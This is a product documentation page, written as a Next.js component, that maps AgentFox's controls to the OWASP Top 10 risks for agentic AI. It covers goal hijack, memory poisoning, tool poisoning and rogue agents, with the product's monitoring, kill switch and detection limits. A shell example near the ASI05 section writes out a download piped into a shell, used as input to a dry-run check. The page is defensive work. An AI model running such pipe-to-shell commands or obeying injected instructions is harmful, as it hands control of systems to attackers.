import type { Metadata } from "next";
import Link from "next/link";

import { Callout, Code, NextSteps } from "@/components/docs/blocks";
import { publicPageMetadata } from "@/lib/site";

export const metadata: Metadata = publicPageMetadata({
  title: "OWASP Top 10 for Agentic Applications (ASI01–ASI10), mapped to AgentFox",
  description:
    "OWASP agentic AI security, item by item: what AgentFox enforces, what it only partly covers and what it does not do for each of ASI01 to ASI10 in the OWASP Top 10 for Agentic Applications.",
  path: "/docs/guides/owasp-agentic-top-10",
});

const SOURCE = "https://genai.owasp.org/resource/owasp-top-10-for-agentic-applications-for-2026/";

type Coverage = "Enforced" | "Partial" | "Not covered";

const SUMMARY: { id: string; name: string; coverage: Coverage; where: string }[] = [
  { id: "asi01", name: "Agent Goal Hijack", coverage: "Partial", where: "tool-containment (enforce), baseline injection rules (observe)" },
  { id: "asi02", name: "Tool Misuse and Exploitation", coverage: "Enforced", where: "tool-containment: grants, limits, provenance, loops, budgets" },
  { id: "asi03", name: "Identity and Privilege Abuse", coverage: "Partial", where: "per-agent grants, delegation narrowing, agent keys; no IdP" },
  { id: "asi04", name: "Agentic Supply Chain Vulnerabilities", coverage: "Partial", where: "scan mcp, scan skills, MCP drift refusal, monitoring" },
  { id: "asi05", name: "Unexpected Code Execution", coverage: "Partial", where: "shell and SQL action analysis; no sandbox" },
  { id: "asi06", name: "Memory and Context Poisoning", coverage: "Partial", where: "/v1/guard/memory_write, memory provenance, retrieval gates" },
  { id: "asi07", name: "Insecure Inter-Agent Communication", coverage: "Partial", where: "/v1/guard/agent_message: signing, replay, sender check" },
  { id: "asi08", name: "Cascading Failures", coverage: "Partial", where: "cascade.* rules, circuit breaker, loop and budget rules" },
  { id: "asi09", name: "Human-Agent Trust Exploitation", coverage: "Partial", where: "approvals bound to exact arguments, escalation policy" },
  { id: "asi10", name: "Rogue Agents", coverage: "Partial", where: "kill switch, shadow-agent findings, audit chain" },
];

export default function Page() {
  return (
    <article className="docs-doc">
      <p className="docs-kicker">Guide</p>
      <h1>OWASP Top 10 for Agentic Applications, mapped to AgentFox</h1>
      <p className="docs-lede">
        The OWASP agentic AI security list, ASI01 to ASI10, one item at a time: what the
        risk is, what AgentFox does about it, and what it does not do. One item is enforced
        out of the box. The other nine are covered in part, and each section says which
        part.
      </p>

      <h2>When to use this</h2>
      <ul>
        <li>Someone asks how your agents stand against the OWASP Top 10 for Agentic Applications.</li>
        <li>You are deciding which AgentFox controls to switch on first, and want them ordered by a list other people recognise.</li>
        <li>You need to know where AgentFox stops, so you can put something else there.</li>
      </ul>
      <p>
        The list is the{" "}
        <a href={SOURCE} rel="noopener noreferrer">
          OWASP Top 10 for Agentic Applications for 2026
        </a>{" "}
        from the OWASP GenAI Security Project, published on 9 December 2025. The risk
        descriptions below are ours, written short; read OWASP&apos;s text for the full
        definitions, examples and mitigations. OWASP&apos;s announcement shortens ASI02 to
        &quot;Tool Misuse&quot;; its later exploit round-ups use the full name used here.
      </p>

      <Callout kind="warning" title="This mapping is a draft">
        <p>
          It is engineering&apos;s reading of the OWASP text, not a review by OWASP, an
          auditor or counsel, the same status as every framework mapping in the{" "}
          <Link href="/docs/limits">compliance catalogue</Link>. The catalogue itself still
          maps to OWASP&apos;s earlier <em>Agentic AI: Threats and Mitigations</em> list
          (T1 to T15), so <code>agentfox report summary</code> reports coverage against T1 to
          T15, not ASI01 to ASI10. Each section below names the T-threats the catalogue
          already maps, which is how this page was built.
        </p>
      </Callout>

      <h2 id="summary">Summary</h2>
      <p>
        <strong>Enforced</strong> means a shipped pack refuses or holds the call from{" "}
        <code>agentfox init</code>, with no further setup beyond declaring your tools and
        granting them. <strong>Partial</strong> means some of the risk is enforced, some is
        only recorded until you promote a pack, and some is not addressed at all.
      </p>
      <table>
        <thead>
          <tr>
            <th>Item</th>
            <th>AgentFox coverage</th>
            <th>Where</th>
          </tr>
        </thead>
        <tbody>
          {SUMMARY.map((row) => (
            <tr key={row.id}>
              <td>
                <a href={`#${row.id}`}>
                  {row.id.toUpperCase()} {row.name}
                </a>
              </td>
              <td>{row.coverage}</td>
              <td>{row.where}</td>
            </tr>
          ))}
        </tbody>
      </table>
      <p>
        Two things apply to every row. AgentFox sees only what is routed through it (the
        SDK, <code>agentfox.auto()</code>, the gateway, MCP governance or coding-agent
        hooks); a call that goes around it is not governed. And containment is only as
        good as your declarations: a destructive tool declared <code>read</code> is treated
        as a read. Both are on <Link href="/docs/limits">Limits</Link>.
      </p>

      <h2 id="asi01">ASI01 Agent Goal Hijack</h2>
      <p>
        <strong>The risk.</strong> Content the agent reads (a web page, an email, a tool
        result, a document) carries instructions that replace the task it was given, so it
        starts working for whoever wrote that content.
      </p>
      <p>
        <strong>What AgentFox does.</strong> It does not rely on spotting the hijack. The{" "}
        <code>tool-containment</code> pack, which enforces from <code>agentfox init</code>,
        tracks where every tool argument came from and refuses or holds an irreversible or
        high-impact call whose arguments came from untrusted content (
        <code>taint.irreversible_tool</code>, <code>taint.high_impact_tool</code>,{" "}
        <code>taint.write_from_tool_result</code>), and holds an irreversible call made with
        no declared task intent (<code>intent.undeclared_irreversible</code>). So a hijacked
        agent can still be persuaded, but it cannot act on the attacker&apos;s values without
        a person. Detection sits on top: the <code>baseline</code> pack&apos;s{" "}
        <code>injection.direct</code>, <code>injection.indirect</code> and{" "}
        <code>injection.adopted_in_reasoning</code> rules, and the opt-in{" "}
        <code>intent.misaligned</code> rule in <code>agent-integrity</code> for a call that
        drifts from the declared task. The catalogue maps this to T6, Intent Breaking and
        Goal Manipulation (controls NOM-RTG-01 and NOM-RTG-04).
      </p>
      <p>
        <strong>What it does not do.</strong> <code>baseline</code> ships in observe, so
        injection detection records until you run <code>agentfox policy enforce baseline</code>.
        <code> intent.misaligned</code> is off per agent until you turn on the
        &quot;Off-task actions&quot; protection. Detectors read text only, and an adaptive
        attacker that retries gets 73% of the attacks the default detectors catch through
        within 50 attempts. A hijack that changes only what the agent says, with no tool
        call, is not contained by provenance at all. Containment also costs legitimate work:
        on AgentDojo only 24 of 97 benign tasks ran without an escalation.
      </p>
      <p>
        See <Link href="/docs/guides/contain-tool-calls">Contain tool calls</Link>,{" "}
        <Link href="/benchmark#containment">containment when detection has failed</Link> and{" "}
        <Link href="/benchmark#adaptive">the adaptive attacker</Link>.
      </p>

      <h2 id="asi02">ASI02 Tool Misuse and Exploitation</h2>
      <p>
        <strong>The risk.</strong> An agent uses tools it is legitimately allowed to use in
        ways nobody intended: wrong arguments, unsafe chains of calls, or runaway volume.
      </p>
      <p>
        <strong>What AgentFox does.</strong> This is what <code>tool-containment</code> is
        for, and it enforces from <code>agentfox init</code> with <code>fail_mode: closed</code>.
        Every tool has a declared impact (<code>read</code>, <code>write</code>,{" "}
        <code>high_impact</code>, <code>irreversible</code>). Every agent gets grants, and a
        call no grant covers is refused (<code>capability.denied</code>). Grants carry
        argument limits (<code>capability.constraint_violated</code>), a provenance ceiling
        and an optional approval requirement. A call to a tool the registry has never seen
        is escalated (<code>tool.not_declared</code>), repeated calls are stopped (
        <code>loop.runaway</code>), and spending, call, token and recursion budgets are
        enforced (<code>budget.exceeded</code>). SQL, shell and HTTP arguments are analysed
        before they run (<code>agentfox test action</code> shows the same analysis). For
        MCP, <code>McpGovernor</code> and <code>/v1/mcp/call</code> apply the same checks
        to every <code>mcp:&lt;server&gt;/&lt;tool&gt;</code> call. The catalogue maps this
        to T2, Tool Misuse (NOM-RTG-04, NOM-DSC-05), and T4, Resource Overload (NOM-RTG-06,
        NOM-RTG-08).
      </p>
      <p>
        <strong>What it does not do.</strong> It cannot tell a harmful use from a harmless
        one when both fit the grant and their arguments came from the user. Impacts inferred
        from a tool&apos;s name are guesses until you confirm them with{" "}
        <code>agentfox declare tool</code>. Budgets and rate limits are per process, so N
        workers get N times the declared budget. Loop governance catches identical repeats,
        alternating cycles and steps with no new observation; an agent that is wrong but
        varied still looks like an agent working.
      </p>
      <p>
        See <Link href="/docs/guides/contain-tool-calls">Contain tool calls</Link> and{" "}
        <Link href="/docs/guides/mcp">MCP servers</Link>.
      </p>

      <h2 id="asi03">ASI03 Identity and Privilege Abuse</h2>
      <p>
        <strong>The risk.</strong> An agent acts with more authority than its task needs,
        borrows a user&apos;s or another agent&apos;s privileges, or is impersonated, because
        nobody can say which agent is acting and on whose behalf.
      </p>
      <p>
        <strong>What AgentFox does.</strong> Each agent is a principal with its own grants,
        default deny, and an optional expiry on each grant. Recording a delegation from
        one agent to another is refused if the child holds a capability its parent&apos;s
        grants do not cover, so authority narrows down a chain and never widens. An agent can carry its own key (<code>nom_agt_…</code>) that binds
        a <code>/v1</code> call to its identity and tenant. A command that would change its
        own grants or switch off enforcement is blocked (<code>control_plane.tamper</code>),
        and that rule cannot be removed from <code>tool-containment</code>. For retrieval,
        answers can be filtered to what the requesting end user may see. The catalogue maps
        this to T3, Privilege Compromise, and T9, Identity Spoofing and Impersonation
        (NOM-IAM-01, NOM-IAM-02, NOM-IAM-05).
      </p>
      <p>
        <strong>What it does not do.</strong> No live identity provider: no Entra or Okta
        integration, no OIDC or SCIM; principals and grants live in AgentFox. On{" "}
        <code>/v1</code>, the agent is named by the <code>X-AgentFox-Agent</code> header or
        request body, and an unknown <code>nom_agt_</code> key is treated as no credential,
        not refused, so identity there is asserted rather than proven. AgentFox does not
        issue or scope the credentials your agent uses against other systems; a database
        password the agent holds is outside its view. The OpenFGA adapter for entitlement is
        a declared seam, not an implementation.
      </p>
      <p>
        See <Link href="/docs/concepts#grant">Capability grant</Link>,{" "}
        <Link href="/docs/guides/gateway">the gateway</Link> (agent credentials) and{" "}
        <Link href="/docs/guides/rag">Retrieval and answers</Link>.
      </p>

      <h2 id="asi04">ASI04 Agentic Supply Chain Vulnerabilities</h2>
      <p>
        <strong>The risk.</strong> Tools, MCP servers, skills, prompts or other agents that
        an agent loads at runtime are malicious, or change after you reviewed them.
      </p>
      <p>
        <strong>What AgentFox does.</strong> <code>agentfox scan mcp</code> reads MCP
        configs without starting anything and reports unpinned versions, literal
        credentials, remote servers without auth, and a lethal trifecta across the servers
        loaded together. Given a server&apos;s <code>tools/list</code> output it snapshots
        the tools, flags instructions hidden in descriptions (<code>tool_poisoning</code>)
        and reports changes (<code>schema_drift</code>). At call time{" "}
        <code>McpGovernor</code> refuses a tool whose definition changed since review (
        <code>mcp.schema_drift</code>), and accepting the change takes two different people.{" "}
        <code>agentfox scan skills</code> checks <code>SKILL.md</code> files for planted
        instructions, and <Link href="/docs/guides/monitoring">monitoring</Link> re-checks
        connected repositories and remote MCP servers on a schedule. The catalogue maps this
        to LLM03 Supply Chain in the OWASP LLM list (NOM-DSC-04, NOM-DSC-05); it has no
        T-threat for it.
      </p>
      <p>
        <strong>What it does not do.</strong> No signature or provenance verification of
        packages, images or models, and no AI bill of materials. It does not scan your
        dependencies for known vulnerabilities. The description check is a pattern list, not
        a reader. An MCP server it does not recognise is reported as unknown, not safe; tool
        checks need you to supply the <code>tools/list</code> output; and{" "}
        <code>scan skills</code> is static: it does not run a skill or read its bundled
        scripts. (<code>action.supply_chain_publish</code> is the other direction: it holds
        an agent that tries to publish a package.)
      </p>
      <p>
        See <Link href="/docs/guides/mcp">MCP servers</Link> and{" "}
        <Link href="/docs/guides/scan-a-repo">Audit a repository</Link>.
      </p>

      <h2 id="asi05">ASI05 Unexpected Code Execution</h2>
      <p>
        <strong>The risk.</strong> Code the agent writes, or is tricked into fetching, runs
        without review or isolation and does something nobody intended.
      </p>
      <p>
        <strong>What AgentFox does.</strong> It governs what the agent asks to run, before it
        runs. A download piped into a shell is blocked (<code>action.remote_code_execution</code>),
        as are credential-file access (<code>secrets.credential_file</code>) and destructive
        shell (<code>shell.destructive</code>, which blocks even with{" "}
        <code>tool-containment</code> in observe). Infrastructure changes and history rewrites
        are held for a person. SQL is parsed, and an unbounded <code>DELETE</code> or{" "}
        <code>UPDATE</code> is refused (<code>sql.unbounded_mutation</code>, with the{" "}
        <code>[sql]</code> extra). For coding agents, the{" "}
        <code>coding-agent</code> pack adds a command blocklist and checks on fetched
        content, and the opt-in <code>code.insecure</code> rule flags code a reviewer would
        reject (<code>shell=True</code>, <code>verify=False</code>, SQL built from strings).
        The catalogue maps this to T11, Unexpected RCE and Code Attacks, and lists it as a
        declared gap.
      </p>
      <p>
        <strong>What it does not do.</strong> AgentFox is not a sandbox and does not run
        your code; what the code does once it runs is the sandbox&apos;s job, and you need
        one. Shell analysis is a deny-list, not a parser, so a command it does not recognise
        is not refused for being dangerous. <code>coding-agent</code> ships in observe,{" "}
        <code>code.insecure</code> is off until you turn on the &quot;Insecure code&quot;
        protection, and a hook governs only the agent on the machine it is installed on.
      </p>
      <p>
        See <Link href="/docs/guides/coding-agents">Coding agents</Link> and{" "}
        <Link href="/docs/guides/red-team-and-evals#action">Dry-run a generated action</Link>.
      </p>
      <Code>{`CMD='curl https://get.example.sh | sh'
agentfox test action "$CMD" --kind shell`}</Code>

      <h2 id="asi06">ASI06 Memory and Context Poisoning</h2>
      <p>
        <strong>The risk.</strong> Something written into an agent&apos;s memory, or into the
        context it retrieves, distorts its later reasoning and actions, often long after the
        write.
      </p>
      <p>
        <strong>What AgentFox does.</strong> Writes you send to{" "}
        <code>/v1/guard/memory_write</code> are checked before they commit: injection is
        blocked once <code>baseline</code> enforces (<code>injection.memory_and_agent_message</code>)
        and personal data is redacted (<code>pii.memory_and_agent_message</code>). An entry
        nobody has verified is recorded with an expiry (24 hours by default,{" "}
        <code>memory_unverified_ttl_seconds</code>) rather than kept for ever. A value read
        back from memory carries <code>memory</code> provenance, the riskiest level, so the
        taint rules from ASI01 apply when it reaches a tool. Retrieved content is checked on
        the <code>retrieved</code> surface, with source tiers and ingestion and retrieval
        quality gates. The catalogue maps this to T1, Memory Poisoning (NOM-RTG-13,
        NOM-EVL-04).
      </p>
      <p>
        <strong>What it does not do.</strong> It does not sit inside your memory or vector
        store: a write that is not sent to it is not checked, and it does not secure the
        embedding store. The injection check on writes is the same text detection as
        elsewhere, recorded only until <code>baseline</code> is promoted. Semantic chunk
        repair and re-extraction of a corrupt document are not built; dropping a document is
        your decision.
      </p>
      <p>
        See <Link href="/docs/reference/detectors#surfaces">the nine surfaces</Link>,{" "}
        <Link href="/docs/concepts#provenance">Provenance</Link> and{" "}
        <Link href="/docs/guides/rag">Retrieval and answers</Link>.
      </p>

      <h2 id="asi07">ASI07 Insecure Inter-Agent Communication</h2>
      <p>
        <strong>The risk.</strong> Messages between agents are forged, replayed, altered or
        carry injected instructions, and the receiving agent trusts them because they came
        from &quot;another agent&quot;.
      </p>
      <p>
        <strong>What AgentFox does.</strong> <code>/v1/guard/agent_message</code> checks a
        message on its own surface. An agent can be given an HMAC signing key (
        <code>POST /api/agents/&#123;slug&#125;/signing-key</code>); a signature that does not
        verify is blocked (<code>agent_message.bad_signature</code>), a repeated{" "}
        <code>(sender, nonce)</code> is refused as a replay, and a sender that is not a
        registered agent is escalated (<code>agent_message.agent_card_mismatch</code>). The
        content goes through injection and personal-data checks, and is tagged{" "}
        <code>subagent</code> provenance, so a value from it that reaches a tool is treated
        as untrusted. The catalogue maps this to T12, Agent Communication Poisoning
        (NOM-IAM-08, NOM-DSC-04).
      </p>
      <p>
        <strong>What it does not do.</strong> It is not a transport: no encryption, no
        mutual TLS, and it sees only messages you send to it. An unsigned message is
        recorded as <code>agent_message.unsigned</code>, not refused, and a message without
        a nonce is not checked for replay (<code>agent_message.no_nonce</code>). It does not
        speak A2A or any other agent protocol for you.
      </p>
      <p>
        See <Link href="/docs/guides/gateway">the gateway</Link> (memory, messages between
        agents, and MCP).
      </p>

      <h2 id="asi08">ASI08 Cascading Failures</h2>
      <p>
        <strong>The risk.</strong> One fault, a bad value, a failing dependency or a
        harmless-looking call, spreads through connected tools and agents into something
        much larger.
      </p>
      <p>
        <strong>What AgentFox does.</strong> Declare what each tool triggers downstream (
        <code>agentfox declare tool … --triggers</code>) and a call is checked against the
        whole graph: one that reaches a destructive tool is blocked (
        <code>cascade.reaches_destructive</code>), a cycle is blocked (
        <code>cascade.cycle</code>), and unusual depth or fan-out is held (
        <code>cascade.blast_radius</code>). Each agent has a circuit breaker that opens after
        a burst of blocked calls (<code>agent.circuit_open</code>), and loop and budget rules
        stop runaway runs. A run that took an irreversible action and ends without
        confirmation it succeeded is blocked (<code>completion.irreversible_unconfirmed</code>).
        Failure attribution traces a failure back to the step that produced the value. The
        catalogue maps this to T5, Cascading Hallucination, and T4, Resource Overload
        (NOM-EVL-03, NOM-RTG-06, NOM-RTG-08).
      </p>
      <p>
        <strong>What it does not do.</strong> Cascade analysis is exactly as good as the
        trigger declarations it is given: an undeclared webhook stays invisible. Budgets are
        per process. Failure attribution works only on constraints that were written down.
        It does not isolate your systems from each other; it can only refuse the calls it
        sees.
      </p>
      <p>
        See <Link href="/docs/guides/contain-tool-calls#rules">What each containment rule does</Link>{" "}
        and <Link href="/docs/limits">Limits</Link>.
      </p>

      <h2 id="asi09">ASI09 Human-Agent Trust Exploitation</h2>
      <p>
        <strong>The risk.</strong> People trust a confident agent: they approve what it
        proposes, or act on what it says, without checking, and an attacker who controls the
        agent uses that trust.
      </p>
      <p>
        <strong>What AgentFox does.</strong> An approval shows the person the exact tool and
        arguments, and lets through exactly that call, once, for the same agent, within 30
        minutes; different arguments file a new approval, and nobody answering is a denial.
        Accepting a changed MCP tool needs two different named people, so an agent cannot
        approve its own listing. An agent that reports a task complete without verified work is
        held (<code>completion.unverified_claim</code>). An escalation policy reports
        conversations that should have reached a person and did not. For answers, the
        knowledge boundary forces abstention outside what the agent may answer, and the
        opt-in <code>grounding.unsupported</code> rule catches claims the retrieved context
        does not support. The catalogue maps this to T10, Overwhelming Human-in-the-Loop
        (NOM-IAM-03).
      </p>
      <p>
        <strong>What it does not do.</strong> It cannot tell whether the person approving
        was misled, and it does not measure whether approvals are being read or
        rubber-stamped. Persuasion in an agent&apos;s reply is not a detector category.
        Human Manipulation (T15) and Human Attacks on Multi-Agent Systems (T14) are declared
        gaps in the catalogue. Containment that escalates too often feeds approval fatigue
        rather than preventing it; see{" "}
        <Link href="/docs/benchmarks#utility">the utility cost</Link>.
      </p>
      <p>
        See <Link href="/docs/guides/approvals">Approvals and the kill switch</Link> and{" "}
        <Link href="/docs/guides/rag">Retrieval and answers</Link>.
      </p>

      <h2 id="asi10">ASI10 Rogue Agents</h2>
      <p>
        <strong>The risk.</strong> An agent behaves outside what it was built for, through
        compromise, drift or misconfiguration, and keeps going because nothing notices or
        nothing can stop it.
      </p>
      <p>
        <strong>What AgentFox does.</strong> <code>agentfox agents quarantine</code> and{" "}
        <code>agentfox agents kill</code> stop an agent: its next model call through the
        proxy, its tool calls and its MCP calls are refused, and the stop and resume are on
        the hash-chained audit log. Traffic from an agent nobody registered creates a{" "}
        <code>shadow_agent</code> finding, every agent is listed with its owner and risk
        tier, and every decision is recorded with the policy version in force. Production
        sampling and drift scoring, and scheduled probes against deployed agents, watch for
        change over time. The catalogue maps this to T13, Rogue Agents, and T8, Repudiation
        and Untraceability (NOM-DSC-01, NOM-DSC-02, NOM-RTG-14, NOM-AUD-01, NOM-AUD-02).
      </p>
      <p>
        <strong>What it does not do.</strong> The kill switch does not stop{" "}
        <code>/v1/guard/input</code>, <code>/v1/guard/output</code> or{" "}
        <code>/v1/guard/memory_write</code>, so an integration that only gates on those
        keeps getting <code>allow</code> for a stopped agent; pending approvals stay
        decidable. A call already past the check finishes. There is no behavioural model that
        decides an agent has gone rogue: stopping it is a person&apos;s decision. Agents are
        found by scanning code, by their traffic and by registration, not by connecting to
        your estate.
      </p>
      <p>
        See <Link href="/docs/guides/approvals">Approvals and the kill switch</Link>,{" "}
        <Link href="/docs/guides/live-probes">Probe deployed agents</Link> and{" "}
        <Link href="/docs/guides/audit-evidence">Prove it to an auditor</Link>.
      </p>

      <h2>Limits of this page</h2>
      <ul>
        <li>The coverage column is a judgement over the whole item; read the section, not just the word.</li>
        <li>&quot;Enforced&quot; means enforced for calls AgentFox sees, against tools you declared.</li>
        <li>Anything named as observe-mode records what it would have done and blocks nothing until you promote it.</li>
      </ul>

      <NextSteps
        items={[
          { href: "/docs/limits", label: "Limits", why: "everything AgentFox does not do, in one place" },
          { href: "/docs/guides/contain-tool-calls", label: "Contain tool calls", why: "the controls behind ASI01 and ASI02" },
          { href: "/docs/guides/audit-evidence", label: "Prove it to an auditor", why: "framework coverage and evidence packages" },
        ]}
      />
    </article>
  );
}
